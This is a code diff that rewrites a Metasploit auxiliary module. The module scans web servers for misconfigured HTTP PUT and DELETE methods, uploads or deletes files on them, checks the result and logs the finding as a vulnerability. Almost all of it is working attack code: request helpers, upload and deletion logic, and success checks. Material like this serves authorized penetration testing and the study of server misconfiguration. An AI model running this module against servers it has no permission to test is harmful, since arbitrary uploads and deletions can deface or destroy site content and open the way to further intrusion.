@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -9,7 +13,6 @@ require 'msf/core'
 
 class Metasploit4 < Msf::Auxiliary
 
-	# Exploit mixins should be called first
 	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::Scanner
 	include Msf::Auxiliary::Report
@@ -19,132 +22,171 @@ class Metasploit4 < Msf::Auxiliary
 			'Name'        => 'HTTP Writable Path PUT/DELETE File Access',
 			'Version'     => '$Revision$',
 			'Description'    => %q{
-					This module can abuse misconfigured web servers to
-				upload and delete web content via PUT and DELETE HTTP
-				requests. Set ACTION to either PUT or DELETE. PUT is the
-				default.
+				This module can abuse misconfigured web servers to upload and delete web content
+				via PUT and DELETE HTTP requests. Set ACTION to either PUT or DELETE.
+
+				PUT is the default.  If filename isn't specified, the module will generate a
+				random string for you as a .txt file. If DELETE is used, a filename is required.
 			},
 			'Author'      =>
 				[
-					'Kashif [at] compulife.com.pk', 'CG'
+					'Kashif [at] compulife.com.pk',
+					'CG',
+					'sinn3r',
 				],
 			'License'     => MSF_LICENSE,
-			'References' => 
+			'References'  => 
 			[
 				[ 'OSVDB', '397'],
-                        ],
+			],
 			'Actions'     =>
 				[
 					['PUT'],
 					['DELETE']
 				],
-			'DefaultAction' => 	'PUT'
+			'DefaultAction' => 'PUT'
 		)
 
 		register_options(
 			[
-				OptString.new('PATH', [ true,  "The path to attempt to write or delete", "/msf_http_put_test.txt"]),
-				OptString.new('DATA', [ false,  "The data to upload into the file", "msf test file"]),
+				OptString.new('PATH', [true,  "The path to attempt to write or delete", "/msf_http_put_test.txt"]),
+				OptString.new('DATA', [false, "The data to upload into the file", "msf test file"]),
+				OptString.new('ACTION', [true, "PUT or DELETE", "PUT"])
 			], self.class)
 	end
 
-	def run_host(ip)
+	#
+	# Send a normal HTTP request and see if our successfully uploaded or deleted a file.
+	# If successful, return true, otherwise false.
+	#
+	def file_exists(path, data)
+		begin
+			res = send_request_cgi(
+				{
+					'uri'    => path,
+					'method' => 'GET',
+					'ctype'  => 'text/plain',
+					'data'   => data,
+				}, 20
+			).to_s
+		rescue ::Exception => e
+			print_error("Error: #{e.to_s}")
+			return nil
+		end
 
-		target_host = ip
-		target_port = datastore['RPORT']
+		return (res =~ /#{data}/) ? true : false
+	end
+
+	#
+	# Do a PUT request to the server.  Function returns the HTTP response.
+	#
+	def do_put(path, data)
+		begin
+			res = send_request_cgi(
+				{
+					'uri'    => path,
+					'method' => 'PUT',
+					'ctype'  => 'text/plain',
+					'data'   => data,
+				}, 20
+			)
+		rescue ::Exception => e
+			print_error("Error: #{e.to_s}")
+			return nil
+		end
+
+		return res
+	end
+
+	#
+	# Do a DELETE request. Function returns the HTTP response.
+	#
+	def do_delete(path)
+		begin
+			res = send_request_cgi(
+				{
+					'uri'    => path,
+					'method' => 'DELETE',
+					'ctype'  => 'text/html',
+				}, 20
+			)
+		rescue ::Exception => e
+			print_error("Error: #{e.to_s}")
+			return nil
+		end
+
+		return res
+	end
+
+	#
+	# Main function for the module, duh!
+	#
+	def run_host(ip)
+		path   = datastore['PATH']
+		data   = datastore['DATA']
+
+		#Add "/" if necessary
+		path = "/#{path}" if path[0,1] != '/'
 
 		case action.name
 		when 'PUT'
-			begin
-				res = send_request_cgi({
-					'uri'          =>  datastore['PATH'],
-					'method'       => 'PUT',
-					'ctype'        => 'text/plain',
-					'data'         => datastore['DATA']
-				}, 20)
+			#Append filename if there isn't one
+			if path !~ /(.+\.\w+)$/
+				path << "#{Rex::Text.rand_text_alpha(5)}.txt"
+				vprint_status("No filename specified. Using: #{path}")
+			end
+	
+			#Upload file
+			res = do_put(path, data)
+			vprint_status("Reply: #{res.code.to_s}")
 
-				if (res.nil?)
-					print_error("No response for #{ip}:#{rport}")
-				elsif (res and res.code >= 200 and res.code < 300)
-
-					#
-					# Detect if file was really uploaded
-					#
-					begin
-						res = send_request_cgi({
-							'uri'  		=>  datastore['PATH'],
-							'method'   	=> 'GET',
-							'ctype'		=> 'text/html'
-						}, 20)
-
-						if (res.nil?)
-							print_error("no response for #{ip}:#{rport}")
-						elsif res and (res.code >= 200 and res.code <= 299)
-							if res.body.include? datastore['DATA']
-								print_good("Upload succeeded on #{ip}:#{rport}#{datastore['PATH']} [#{res.code}]")
-								report_vuln(
-									:host	=> target_host,
-									:port	=> rport,
-									:proto	=> 'tcp',
-									:sname	=> 'http',
-									:name	=> self.fullname,
-									:info	=> "PUT ENABLED",
-									:refs	=> self.references,
-									:exploited_at => Time.now.utc
-								)
-							end
-						else
-							print_error("Received a #{res.code} code, upload failed on #{ip}:#{rport}#{datastore['PATH']} [#{res.code} #{res.message}]")
-						end
-
-					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
-						print_error "No connection"
-					rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH => e
-					print_error e.message
-					end
-				elsif(res.code == 302 or res.code == 301)
-					print_status("Received #{res.code} Redirect to #{res.headers['Location']}")
-				else
-					print_error("Received #{res.code} code, upload failed on #{ip}:#{rport} #{datastore['PATH']} [#{res.code} #{res.message}]")
-				end
-
-			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-				#print_error "No connection"
-			rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH => e
-				print_error e.message
+			#Check file
+			if not res.nil? and file_exists(path, data)
+				print_good("File uploaded: #{ip}:#{rport}#{path}")
+				report_vuln(
+					:host         => ip,
+					:port         => rport,
+					:proto        => 'tcp',
+					:name         => self.fullname,
+					:info         => "PUT Enabled",
+					:refs         => self.references,
+					:exploited_at => Time.now.utc,
+				)
+			else
+				print_error("File doesn't seem to exist. The upload probably failed.")
 			end
 
 		when 'DELETE'
-			begin
-				res = send_request_cgi({
-					'uri'          => datastore['PATH'],
-					'method'       => 'DELETE'
-				}, 10)
+			#Check file before deleting
+			if path !~ /(.+\.\w+)$/
+				print_error("You must supply a filename")
+				return
+			elsif not file_exists(path, data)
+				print_error("File is already gone. Will not continue DELETE")
+				return
+			end
 
-				return if not res
-				if (res and res.code >= 200 and res.code < 300)
-					print_good("Delete succeeded on #{ip}:#{rport}#{datastore['PATH']} [#{res.code}]")
+			#Delete our file
+			res = do_delete(path)
+			print_status("Reply: #{res.code.to_s}")
 
-					report_vuln(
-						:host	=> target_host,
-						:port	=> rport,
-						:proto	=> 'tcp',
-						:sname	=> 'http',
-						:name 	=> self.fullname,
-						:info 	=> "DELETE ENABLED",
-						:refs 	=> self.references,
-						:exploited_at => Time.now.utc
-					)
-
-				else
-					print_error("Delete failed #{ip}:#{rport} [#{res.code} #{res.message}]")
-				end
-
-			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
-				#print_error "No connection"
-			rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH => e
-				print_error e.message
+			#Check if DELETE was successful
+			if res.nil? or file_exists(path, data)
+				print_error("DELETE failed. File is still there.")
+			else
+				print_good("File deleted: #{ip}:#{rport}#{path}")
+				report_vuln(
+					:host         => ip,
+					:port         => rport,
+					:proto        => 'tcp',
+					:sname        => 'http',
+					:name         => self.fullname,
+					:info         => "DELETE ENABLED",
+					:refs         => self.references,
+					:exploited_at => Time.now.utc
+				)
 			end
 		end
 	end
+
 end
